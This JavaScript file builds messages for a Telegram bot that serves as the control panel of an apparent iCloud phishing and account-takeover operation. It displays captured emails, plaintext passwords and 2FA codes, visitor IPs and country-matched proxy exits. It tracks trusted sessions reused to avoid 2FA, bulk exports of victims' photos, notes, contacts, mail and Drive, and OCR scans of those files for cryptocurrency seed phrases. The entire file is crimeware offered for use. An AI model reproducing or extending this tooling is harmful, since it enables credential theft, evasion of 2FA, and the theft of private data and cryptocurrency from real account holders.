import { InlineKeyboard } from "grammy";

/* Message + keyboard builders for the Telegram bot.  Keeping text and layout
 * here leaves bot.js to do nothing but route updates. */

export const PAGE_SIZE = 5;

export function escapeHtml(value) {
  return String(value ?? "")
    .replaceAll("&", "&amp;")
    .replaceAll("<", "&lt;")
    .replaceAll(">", "&gt;");
}

const num = (value) => {
  const n = Number(value);
  return Number.isFinite(n) ? n : 0;
};

/** ISO country code -> flag emoji (🇮🇩, 🇫🇷, ...). */
export function countryFlag(code) {
  const cc = String(code ?? "").trim().toUpperCase();
  if (!/^[A-Z]{2}$/.test(cc) || cc === "XX") return "";
  return String.fromCodePoint(
    ...[...cc].map((char) => 0x1f1e6 + char.charCodeAt(0) - 65)
  );
}

/** "🇮🇩 Indonesia", "🇮🇩 ID", or the fallback when there is no code. */
export function placeLabel(code, name = "") {
  const flag = countryFlag(code);
  const label = name || String(code ?? "").toUpperCase();
  return [flag, label].filter(Boolean).join(" ") || "—";
}

function proxyLabel(proxy = {}) {
  const requested = placeLabel(proxy.country, "");
  const exit = proxy.exitCountry
    ? placeLabel(proxy.exitCountry, proxy.exitCountry)
    : "";
  if (proxy.supported === false) {
    const asked = placeLabel(proxy.requestedCountry || proxy.country, proxy.requestedCountry || proxy.country);
    const replacement = exit
      ? `→ any exit ${exit} ${proxy.exitIp || "—"}`
      : "→ will use an any-country exit";
    return `${asked} · ⚠️ not supported by anyIP ${replacement}`;
  }
  if (
    proxy.exitCountry &&
    proxy.exitCountry === String(proxy.country || "").toUpperCase()
  ) {
    return `${requested} · exit ${proxy.exitIp || "—"}`;
  }
  const parts = [requested, "exit", exit, proxy.exitIp || "—"].filter(Boolean);
  const line = parts.join(" ");
  return proxy.matched === false ? `${line} · ⚠️ country mismatch` : line;
}

function accountBadges(account, now = Date.now()) {
  const out = [];
  const created = Date.parse(account.createdAt || "");
  if (Number.isFinite(created) && now - created < 10 * 60 * 1000) {
    out.push("NEW");
  }
  const badges = account.badges || {};
  const filesUntil = Date.parse(badges.newFilesUntil || "");
  if (Number.isFinite(filesUntil) && filesUntil > now && num(badges.newFiles) > 0) {
    out.push(`NEW FILES ${num(badges.newFiles)}`);
  }
  const seedsUntil = Date.parse(badges.newSeedsUntil || "");
  if (Number.isFinite(seedsUntil) && seedsUntil > now && num(badges.newSeeds) > 0) {
    out.push(`NEW SEEDS ${num(badges.newSeeds)}`);
  }
  return out;
}

export function formatBytes(value) {
  const bytes = num(value);
  if (bytes < 1024) return `${Math.round(bytes)} B`;
  if (bytes < 1024 ** 2) return `${(bytes / 1024).toFixed(1)} KB`;
  if (bytes < 1024 ** 3) return `${(bytes / 1024 ** 2).toFixed(1)} MB`;
  return `${(bytes / 1024 ** 3).toFixed(2)} GB`;
}

/** ███████░░░ 70% — used in cards and every progress event. */
export function progressBar(done, total, width = 10) {
  const d = Math.max(0, num(done));
  const t = Math.max(0, num(total));
  const ratio = t ? Math.min(1, d / t) : 0;
  const filled = Math.round(ratio * width);
  return `${"█".repeat(filled)}${"░".repeat(Math.max(0, width - filled))} ${Math.round(ratio * 100)}%`;
}

export function statusLight(account) {
  if (!account) return "🟡";
  if (["dead", "twofa", "invalid", "error"].includes(account.status)) return "🔴";
  if (
    ["connected", "done"].includes(account.status) &&
    account.trusted &&
    account.lastPingAt
  ) {
    return "🟢";
  }
  return "🟡";
}

function statusText(account) {
  if (account.locked) {
    return `🔒 <b>locked</b>${account.lockCode ? ` (${escapeHtml(account.lockCode)})` : ""}`;
  }
  if (!account.password && account.status === "queued") {
    return "<b>email entered</b> · waiting for password";
  }
  const trusted = account.trusted
    ? " · 🔐 trusted (no 2FA next time)"
    : " · no saved trust";
  return `<b>${escapeHtml(account.status)}</b>${trusted}`;
}

/* ------------------------------------------------------------------ menus */

export function menuView() {
  const keyboard = new InlineKeyboard()
    .text("👤 Accounts", "accounts:1")
    .text("📊 Stats", "stats")
    .row()
    .text("📥 Submissions", "list:1")
    .text("🔄 Refresh", "menu")
    .row()
    .text("✖ Close", "close");
  return {
    text: [
      "<b>iCloud control panel</b>",
      "",
      "👤 Accounts — browse every captured account (5/page), open one,",
      "   re-auth, export, OCR-scan, verify or ping it.",
      "📊 Stats — totals and worker slots.",
      "📥 Submissions — raw email/password/code submissions.",
      "",
      "Every sign-in, 2FA prompt, account snapshot, export step and OCR",
      "scan is posted to this group automatically.",
    ].join("\n"),
    keyboard,
  };
}

export function listView(pageData) {
  const keyboard = new InlineKeyboard();
  for (const item of pageData.items) {
    const label = `${item.status === "new" ? "🟢" : item.status === "reviewed" ? "🟡" : "⚪"} ${item.email || "(no email)"}`;
    keyboard.text(label.slice(0, 60), `item:${item.id}`).row();
  }

  if (pageData.pages > 1) {
    if (pageData.page > 1) keyboard.text("‹ Prev", `list:${pageData.page - 1}`);
    keyboard.text(`${pageData.page} / ${pageData.pages}`, "noop");
    if (pageData.page < pageData.pages) {
      keyboard.text("Next ›", `list:${pageData.page + 1}`);
    }
    keyboard.row();
  }
  keyboard.text("🏠 Menu", "menu").text("🔄 Refresh", `list:${pageData.page}`);

  const lines = pageData.items.map(
    (item, index) =>
      `${(pageData.page - 1) * pageData.pageSize + index + 1}. ` +
      `<b>${escapeHtml(item.email || "(no email)")}</b> — ` +
      `${escapeHtml(item.status)} · ${escapeHtml(item.country || "?")}`
  );

  return {
    text: [
      `<b>Submissions</b> (${pageData.total})`,
      "",
      ...(lines.length ? lines : ["Nothing here yet."]),
    ].join("\n"),
    keyboard,
  };
}

export function itemView(item) {
  const keyboard = new InlineKeyboard()
    .text("✅ Reviewed", `set:${item.id}:reviewed`)
    .text("🏁 Done", `set:${item.id}:done`)
    .row()
    .text("🟢 New", `set:${item.id}:new`)
    .text("🗑 Delete", `delask:${item.id}`)
    .row()
    .text("‹ Back", "list:1")
    .text("🏠 Menu", "menu");

  const when = new Date(item.createdAt).toLocaleString("en-GB", {
    dateStyle: "short",
    timeStyle: "short",
  });

  return {
    text: [
      `<b>${escapeHtml(item.email || "(no email)")}</b>`,
      "",
      `Password: <code>${escapeHtml(item.password || "—")}</code>`,
      `Code: <code>${escapeHtml(item.code || "—")}</code>`,
      `Page: ${escapeHtml(item.page)}`,
      `IP: ${escapeHtml(item.ip || "—")}`,
      `Country: ${escapeHtml(item.country || "—")}`,
      `Status: <b>${escapeHtml(item.status)}</b>`,
      `Created: ${escapeHtml(when)}`,
      `Note: ${escapeHtml(item.note || "—")}`,
    ].join("\n"),
    keyboard,
  };
}

export function statsView(stats) {
  const keyboard = new InlineKeyboard()
    .text("📥 Submissions", "list:1")
    .text("🔄 Refresh", "stats")
    .row()
    .text("🏠 Menu", "menu");

  return {
    text: [
      "<b>Stats</b>",
      "",
      `Total: ${stats.total}`,
      `New: ${stats.byStatus.new ?? 0}`,
      `Reviewed: ${stats.byStatus.reviewed ?? 0}`,
      `Done: ${stats.byStatus.done ?? 0}`,
    ].join("\n"),
    keyboard,
  };
}

export function confirmDeleteView(item) {
  const keyboard = new InlineKeyboard()
    .text("Yes, delete", `del:${item.id}`)
    .text("Cancel", `item:${item.id}`);
  return {
    text: `<b>Delete</b> ${escapeHtml(item.email || item.id)}?\nThis cannot be undone.`,
    keyboard,
  };
}

/* ---------------------------------------------------------------- accounts */

export function accountStatsView(accounts, jobs, workers) {
  const keyboard = new InlineKeyboard()
    .text("👤 Accounts", "accounts:1")
    .text("🔄 Refresh", "stats")
    .row()
    .text("🏠 Menu", "menu");
  const by = accounts.byStatus || {};
  return {
    text: [
      "<b>Stats</b>",
      "",
      `Accounts: ${accounts.total}`,
      `Connected: ${by.connected ?? 0} · 2FA: ${by.twofa ?? 0}`,
      `Queued: ${by.queued ?? 0} · Exporting: ${by.exporting ?? 0}`,
      `Invalid: ${by.invalid ?? 0} · Error: ${by.error ?? 0} · Dead: ${by.dead ?? 0}`,
      `Done: ${by.done ?? 0} · Trusted: ${accounts.trusted ?? 0}`,
      "",
      `Jobs: ${jobs.total}`,
      `Workers: ${workers.workers} · auth slots ${workers.auth} · export ${workers.export} · queued ${workers.queued ?? 0}`,
    ].join("\n"),
    keyboard,
  };
}

function accountLabel(account) {
  const short = account.shortId ? `#${account.shortId}` : "";
  const tag = account.identity?.name ? ` · ${account.identity.name}` : "";
  return `${statusLight(account)} ${account.email || "(no email)"}${short ? ` ${short}` : ""}${tag}`;
}

export function accountListView(pageData, stats = null) {
  const keyboard = new InlineKeyboard();
  const first = (pageData.page - 1) * pageData.pageSize;
  pageData.items.forEach((account, index) => {
    keyboard.text(`${first + index + 1}. ${accountLabel(account)}`.slice(0, 62), `acct:${account.id}`).row();
  });

  if (pageData.pages > 1) {
    if (pageData.page > 1) keyboard.text("‹ Prev", `accounts:${pageData.page - 1}`);
    keyboard.text(`${pageData.page} / ${pageData.pages}`, "noop");
    if (pageData.page < pageData.pages) {
      keyboard.text("Next ›", `accounts:${pageData.page + 1}`);
    }
    keyboard.row();
  }
  keyboard.text("🔄 Refresh", `accounts:${pageData.page}`).text("🏠 Menu", "menu");

  const lines = pageData.items.map((account, index) => {
    const c = account.counts || {};
    const bits = [
      `🖼 ${num(c.photos)}`,
      `🕶 ${num(c.hidden)}`,
      `📝 ${num(c.notes)}`,
      `📇 ${num(c.contacts)}`,
    ].join(" · ");
    const labels = accountBadges(account);
    return [
      `${first + index + 1}. ${statusLight(account)} <b>${escapeHtml(account.email || "(no email)")}</b>`,
      `   ${escapeHtml(account.status)}${account.trusted ? " · trusted" : ""} · ${escapeHtml(placeLabel(account.geo?.countryCode, account.geo?.country || "?"))} · ${bits}${labels.length ? ` · ${labels.map((label) => escapeHtml(label)).join(" · ")}` : ""}`,
    ].join("\n");
  });

  const by = stats?.byStatus || {};
  return {
    text: [
      `<b>Accounts</b> (${pageData.total})`,
      stats
        ? `🟢 connected ${by.connected ?? 0} · 🟡 queued ${by.queued ?? 0} · 🔴 2FA ${by.twofa ?? 0} · dead ${by.dead ?? 0}`
        : "",
      "",
      ...(lines.length ? lines : ["No accounts yet."]),
    ]
      .filter((line, index) => line !== "" || index < 2)
      .join("\n"),
    keyboard,
  };
}

export function accountDetailView(account) {
  const keyboard = new InlineKeyboard()
    .text("🔐 Re-auth", `act:${account.id}:auth`)
    .text("⬇️ Export", `act:${account.id}:export`)
    .row()
    .text("🔎 OCR scan", `act:${account.id}:scan`)
    .text("🧾 Verify", `act:${account.id}:verify`)
    .row()
    .text("📡 Ping", `act:${account.id}:ping`)
    .text("🔄 Refresh", `acct:${account.id}`)
    .row()
    .text("‹ Accounts", "accounts:1")
    .text("🏠 Menu", "menu");

  return {
    text: accountCard(account, { title: account.identity?.name || account.email }),
    keyboard,
  };
}

/* ------------------------------------------------------------ account card */

export function formatCounts(counts = {}, identity = {}) {
  const c = counts || {};
  const plan = identity?.plan || {};
  const storage = identity?.storage || {};
  const lines = [
    `🖼 Photos: <b>${num(c.photos)}</b> · Hidden: <b>${num(c.hidden)}</b> · Deleted: <b>${num(c.deleted)}</b>`,
    `📝 Notes: <b>${num(c.notes)}</b> · Albums: <b>${num(c.albums)}</b>`,
    `📇 Contacts: <b>${num(c.contacts)}</b> (☎ ${num(c.contactsPhone)} / ✉ ${num(c.contactsEmail)})`,
    `📅 Calendars: <b>${num(c.calendars)}</b> · Reminders: <b>${num(c.reminders)}</b>`,
    `📁 Drive: <b>${num(c.driveFiles)}</b> files · ${formatBytes(c.driveBytes)}`,
    `✉️ Mail: <b>${num(c.mailFolders)}</b> folders · <b>${num(c.mailMessages)}</b> messages`,
  ];
  const used = plan.used ?? storage.used;
  const total = plan.total ?? storage.total;
  if (used != null) {
    lines.push(
      `💾 Storage: ${formatBytes(used)}${total != null ? ` / ${formatBytes(total)}` : ""}${plan.percent != null ? ` (${num(plan.percent)}%)` : ""}`
    );
  }
  if (plan.featureKey) lines.push(`⭐️ Plan: ${escapeHtml(plan.featureKey)}`);
  if (identity?.family?.length) {
    lines.push(`👨‍👩‍👧 Family: ${identity.family.length}`);
  }
  if (identity?.devices?.length) {
    lines.push(`📱 Devices: ${identity.devices.length}`);
  }
  return lines;
}

export function exportLines(exportState = {}) {
  const state = exportState || {};
  const phase = state.phase || "idle";
  if (phase === "idle") return ["⬇️ Export: idle"];

  const done = num(state.overallDone ?? state.done);
  const total = num(state.overallTotal ?? state.total);
  const bytes = num(state.bytes);
  const lines = [
    `⬇️ Export: <b>${escapeHtml(phase)}</b> ${progressBar(done, total)}`,
    `   ${done}/${total} items · ${formatBytes(bytes)}${state.failed ? ` · ${num(state.failed)} failed` : ""}`,
  ];
  const areas = state.areas || {};
  const entries = Object.entries(areas)
    .filter(([, area]) => num(area?.total) > 0)
    .slice(0, 10);
  for (const [area, value] of entries) {
    lines.push(
      `   • ${escapeHtml(area)}: ${num(value.done)}/${num(value.total)} · ${formatBytes(value.bytes)}`
    );
  }
  if (state.manifestPath) {
    lines.push(`   manifest: ${escapeHtml(String(state.manifestPath).split("/").pop())}`);
  }
  return lines;
}

export function scanLines(scan = {}) {
  const state = scan || {};
  if (!state.phase || state.phase === "idle") return ["🔎 OCR scan: idle"];

  const tiers = state.tiers || {};
  const newTiers = state.newTiers || {};
  const lines = [
    `🔎 OCR scan: <b>${escapeHtml(state.phase)}</b>${state.area ? ` · ${escapeHtml(state.area)}` : ""}`,
  ];
  if (state.phase === "running") {
    lines.push(`   ${progressBar(state.done, state.total)} · ${num(state.done)}/${num(state.total)} files`);
    return lines;
  }
  lines.push(
    `   Files: <b>${num(state.files)}</b> · Images: <b>${num(state.images)}</b>`,
    `   OCR: <b>${num(state.ocrOk)}</b> ok · <b>${num(state.ocrFailed)}</b> failed`,
    `   Seed phrases found: <b>${num(state.findings)}</b>${state.hitFiles != null ? ` in <b>${num(state.hitFiles)}</b> files` : ""}${state.hitImages != null ? ` (${num(state.hitImages)} images)` : ""}`,
    ...(state.newFindings != null
      ? state.newFindings > 0
        ? [
            `   🆕 NEW since last scan: <b>${num(state.newFindings)}</b> · 🟥 high ${num(newTiers.high)} · 🟧 medium ${num(newTiers.medium)} · 🟨 minimum ${num(newTiers.minimum)} · 🟦 low ${num(newTiers.low)} · ✅ valid ${num(newTiers.valid)}`,
          ]
        : ["   🆕 NEW since last scan: none"]
      : []),
    `   ✅ checksum-valid: <b>${num(tiers.valid)}</b>`,
    `   🟥 high (12/15/18/21/24): <b>${num(tiers.high)}</b>`,
    `   🟧 medium (8–11): <b>${num(tiers.medium)}</b>`,
    `   🟨 minimum (5–7): <b>${num(tiers.minimum)}</b>`,
    `   🟦 low (3–4): <b>${num(tiers.low)}</b>`
  );
  return lines;
}

export function accountCard(account, { title = "", extra = "" } = {}) {
  const identity = account.identity || {};
  const geo = account.geo || {};
  const proxy = account.proxy || {};
  const labels = accountBadges(account);
  const lines = [
    `${statusLight(account)} <b>${escapeHtml(title || account.email)}</b>`,
    `🏷 <code>${escapeHtml(account.shortId || account.id)}</code>`,
    `📧 ${escapeHtml(account.email)}`,
    account.password
      ? `🔑 <code>${escapeHtml(account.password)}</code>`
      : `🔑 <i>${account.status === "queued" ? "not entered yet" : "—"}</i>`,
    labels.length ? `📌 ${labels.map(escapeHtml).join(" · ")}` : "",
    identity.name ? `👤 ${escapeHtml(identity.name)}` : "",
    identity.phone ? `📞 ${escapeHtml(identity.phone)}` : "",
    `Status: ${statusText(account)}`,
    account.locked ? "Unlock: https://iforgot.apple.com" : "",
    `🌍 Visitor: ${escapeHtml(placeLabel(geo.countryCode, geo.country))} (${escapeHtml(geo.ip || "—")})`,
    `🛡 Proxy: ${escapeHtml(proxyLabel(proxy))}`,
    account.lastPingAt
      ? `📡 Last ping: ${escapeHtml(new Date(account.lastPingAt).toLocaleString("en-GB"))}`
      : "",
    account.lastError ? `⚠️ Error: ${escapeHtml(account.lastError)}` : "",
    "",
    "<b>Account contents</b>",
    ...formatCounts(account.counts, identity),
    "",
    "<b>Export</b>",
    ...exportLines(account.export),
    "",
    "<b>Seed scan</b>",
    ...scanLines(account.scan),
  ];
  if (extra) {
    lines.push("", escapeHtml(extra));
  }
  return lines.filter((line) => line !== "").join("\n").slice(0, 4000);
}

/* --------------------------------------------------------- event messages */

const METHOD_LABEL = {
  sms: "SMS",
  trusted_device: "Trusted device",
  security_key: "Security key",
  legacy_device: "Two-step (legacy device)",
  unknown: "Unknown",
};

function humanWhen(iso) {
  if (!iso) return "";
  const date = new Date(iso);
  return Number.isNaN(date.getTime())
    ? ""
    : date.toLocaleString("en-GB", { dateStyle: "short", timeStyle: "medium" });
}

/** One chat message per pool step.  Returns null for events with no message. */
export function poolEventView(type, account, payload = {}) {
  if (!account) return null;
  const email = escapeHtml(account.email);
  const password = escapeHtml(account.password || "—");
  const geo = account.geo || {};
  const proxy = account.proxy || {};
  const head = (emoji, title) => `${emoji} <b>${title}</b> · ${email}`;

  if (type === "email_entered") {
    const known = payload.newAccount ? "new" : "returning";
    return [
      head("👀", payload.newAccount ? "New visitor — email entered" : "Visitor resumed — email entered"),
      `📧 Email: <b>${email}</b>`,
      `📌 Record: ${known} · status ${escapeHtml(account.status)}${
        account.lastError ? ` — ${escapeHtml(String(account.lastError).slice(0, 90))}` : ""
      }${account.trusted ? " · trusted session saved" : ""}`,
      account.password
        ? `🔑 Password: <code>${password}</code>${account.trusted ? " · signed in before" : " · saved"}`
        : `🔑 Password: <b>not entered yet</b>`,
      `🌍 Visitor: ${escapeHtml(placeLabel(geo.countryCode, geo.country))} (${escapeHtml(geo.ip || "—")})`,
      `🛡 Proxy: ${escapeHtml(proxyLabel(proxy))}`,
      `🕒 ${escapeHtml(humanWhen(new Date().toISOString()))}`,
    ].join("\n");
  }

  if (type === "auth_start") {
    return [
      head("🆕", "Sign-in submitted"),
      `🔑 Password: <code>${password}</code>`,
      `🌍 Visitor: ${escapeHtml(placeLabel(geo.countryCode, geo.country))} (${escapeHtml(geo.ip || "—")})`,
      `🛡 Proxy: ${escapeHtml(proxyLabel(proxy))}`,
      `🧭 Job: <code>${escapeHtml(payload.job?.id?.slice(0, 8) || "—")}</code>`,
      account.fingerprint?.userAgent
        ? `🖥 UA: ${escapeHtml(account.fingerprint.userAgent).slice(0, 120)}`
        : "",
    ]
      .filter(Boolean)
      .join("\n");
  }

  if (type === "state") {
    if (!payload.message) return null;
    if (payload.reused || /already connected|saved session/i.test(payload.message)) {
      return [
        head("♻️", "Saved session reused"),
        `🔑 Password: <code>${password}</code>`,
        `✅ ${escapeHtml(payload.message)} — no 2FA / SMS needed.`,
      ].join("\n");
    }
    return [
      head("🔐", "Sign-in step"),
      `➡️ ${escapeHtml(payload.message)}${payload.state ? ` (${escapeHtml(payload.state)})` : ""}`,
    ].join("\n");
  }

  if (type === "twofa") {
    const method = METHOD_LABEL[payload.method] || payload.method || "Unknown";
    const showed = (payload.options || []).filter((option) => option?.active);
    const shown = (showed.length ? showed : (payload.options || []).slice(0, 3))
      .map((option) => `${option.label}${option.detail ? ` — ${option.detail}` : ""}`)
      .join("; ");
    const emoji = payload.method === "sms" ? "📲" : payload.method === "security_key" ? "🔑" : "📱";
    return [
      head(emoji, "2FA required"),
      `🔑 Password: <code>${password}</code>`,
      `Method: <b>${escapeHtml(method)}</b>`,
      payload.notice ? `Notice: ${escapeHtml(payload.notice)}` : "",
      shown ? `Delivery: ${escapeHtml(shown)}` : "",
      payload.switchedFrom || payload.switchedTo
        ? `Switched: ${escapeHtml(payload.switchedFrom || "?")} → ${escapeHtml(payload.switchedTo || "?")}`
        : "",
      `🌍 ${escapeHtml(placeLabel(geo.countryCode, geo.country))} · proxy ${escapeHtml(proxyLabel(proxy))}`,
    ]
      .filter(Boolean)
      .join("\n");
  }

  if (type === "result") {
    if (payload.status === "ok") {
      const reused = /already connected/i.test(payload.message || "");
      return [
        head("✅", reused ? "Saved session — already connected" : "Login successful"),
        `🔑 Password: <code>${password}</code>`,
        `💬 ${escapeHtml(payload.message || "Signed in")}`,
        `🔐 Trusted session: ${account.trusted ? "yes — no 2FA next time" : "not confirmed"}`,
        `🌍 ${escapeHtml(placeLabel(geo.countryCode, geo.country))} · 🛡 ${escapeHtml(proxyLabel(proxy))}`,
      ].join("\n");
    }
    if (payload.reason === "locked") {
      return [
        head("🔒", "Account locked"),
        `🔑 Password: <code>${password}</code>`,
        `💬 ${escapeHtml(payload.message || "Locked for security reasons")}`,
        `Code: ${escapeHtml(account.lockCode || "—")}`,
        "Unlock: https://iforgot.apple.com",
      ].join("\n");
    }
    if (payload.status === "invalid") {
      return [
        head("❌", "Login failed — invalid credentials"),
        `🔑 Password: <code>${password}</code>`,
        `💬 Reason: ${escapeHtml(payload.message || "Incorrect Apple Account or password.")}`,
        `🌍 ${escapeHtml(placeLabel(geo.countryCode, geo.country))} (${escapeHtml(geo.ip || "—")}) · proxy ${escapeHtml(proxyLabel(proxy))}`,
      ].join("\n");
    }
    return [
      head("⚠️", "Login error"),
      `🔑 Password: <code>${password}</code>`,
      `💬 ${escapeHtml(payload.message || "authentication failed")}`,
      `Reason: ${escapeHtml(payload.reason || "error")}`,
    ].join("\n");
  }

  if (type === "account_info") {
    return [
      head("📊", "Account captured"),
      ...formatCounts(account.counts, account.identity || {}),
      account.identity?.name ? `👤 Name: ${escapeHtml(account.identity.name)}` : "",
      account.identity?.phone ? `📞 Phone: ${escapeHtml(account.identity.phone)}` : "",
      `🔐 Trusted: ${account.trusted ? "yes" : "no"}`,
    ]
      .filter(Boolean)
      .join("\n");
  }

  if (type === "export_start") {
    return [
      head("⬇️", "Export started"),
      `Mode: ${escapeHtml(payload.mode || "missing")}`,
      `Job: <code>${escapeHtml(payload.job?.id?.slice(0, 8) || "—")}</code>`,
    ].join("\n");
  }

  if (type === "export_progress") {
    const progress = payload.progress || account.export || {};
    const done = num(progress.overallDone ?? progress.done);
    const total = num(progress.overallTotal ?? progress.total);
    return [
      head("⬇️", "Export progress"),
      progressBar(done, total),
      `${done}/${total} · ${formatBytes(progress.bytes)}`,
      progress.area ? `Area: <b>${escapeHtml(progress.area)}</b>` : "",
    ]
      .filter(Boolean)
      .join("\n");
  }

  if (type === "export_done") {
    const totals = payload.totals || {};
    return [
      head("✅", "Export complete"),
      `${num(totals.done)}/${num(totals.total)} items · ${formatBytes(totals.bytes)}${num(totals.failed) ? ` · ${num(totals.failed)} failed` : ""}`,
      "",
      ...exportLines({
        ...account.export,
        ...totals,
        overallDone: totals.done ?? account.export?.overallDone,
        overallTotal: totals.total ?? account.export?.overallTotal,
        phase: "done",
      }).slice(1),
    ].join("\n");
  }

  if (type === "scan_start") {
    return [head("🔎", "OCR scan started"), "Reading every exported file."].join("\n");
  }

  if (type === "scan_progress") {
    const scan = payload.scan || account.scan || {};
    return [
      head("🔎", "OCR scan progress"),
      progressBar(scan.done, scan.total),
      `${num(scan.done)}/${num(scan.total)} files${scan.area ? ` · ${escapeHtml(scan.area)}` : ""}`,
    ].join("\n");
  }

  if (type === "scan") {
    return [head("🔎", "OCR scan complete"), ...scanLines({ ...account.scan, ...payload.scan })].join("\n");
  }

  if (type === "verify_start") {
    return [head("🧾", "Verification started"), "Comparing the export against the live account."].join("\n");
  }

  if (type === "verify") {
    const verify = payload.verify || account.verify || {};
    const entries = Object.entries(verify.areas || {}).slice(0, 12);
    const changed = entries
      .map(([area, value]) => ({
        area,
        live: num(value?.live),
        exported: num(value?.exported),
        missing: num(value?.missing),
      }))
      .filter((item) => item.missing > 0);
    const totalMissing = changed.reduce((sum, item) => sum + item.missing, 0);
    const areas = entries.map(
      (item) =>
        `• ${escapeHtml(item[0])}: live ${num(item[1]?.live)} / exported ${num(item[1]?.exported)}${num(item[1]?.missing) ? ` · <b>${num(item[1].missing)} new</b>` : ""}`
    );
    return [
      head("🧾", "Live check"),
      totalMissing
        ? `🆕 New since last check: <b>${totalMissing}</b> (${changed.map((item) => `${escapeHtml(item.area)} ${item.missing}`).join(" · ")})`
        : "✅ No changes since the last check.",
      ...areas,
      areas.length ? "" : "No areas reported.",
    ].join("\n");
  }

  if (type === "ping") {
    return [
      head(payload.ok ? "📡" : "💀", payload.ok ? "Session alive" : "Session dead"),
      payload.ok
        ? `Trusted: ${account.trusted ? "yes" : "no"} · ${escapeHtml(humanWhen(account.lastPingAt))}`
        : `Reason: ${escapeHtml(account.lastError || "session expired")}`,
    ].join("\n");
  }

  if (type === "import_start") {
    return [head("📦", "Import started"), "Reading an existing export folder."].join("\n");
  }

  if (type === "import_progress") {
    const progress = payload.progress || {};
    return [
      head("📦", "Import progress"),
      progressBar(progress.done, progress.total),
      `${num(progress.done)}/${num(progress.total)}`,
    ].join("\n");
  }

  if (type === "import") {
    return [head("📦", "Import complete"), ...scanLines({ ...account.scan })].join("\n");
  }
  if (type === "error") {
    return [
      head("⚠️", "Error"),
      `Job: ${escapeHtml(payload.job?.type || "?")} · <code>${escapeHtml(payload.job?.id?.slice(0, 8) || "—")}</code>`,
      `🔑 Password: <code>${password}</code>`,
      `💬 ${escapeHtml(payload.error || "worker error")}`,
      `🌍 ${escapeHtml(placeLabel(geo.countryCode, geo.country))} · proxy ${escapeHtml(proxyLabel(proxy))}`,
    ].join("\n");
  }

  return null;
}
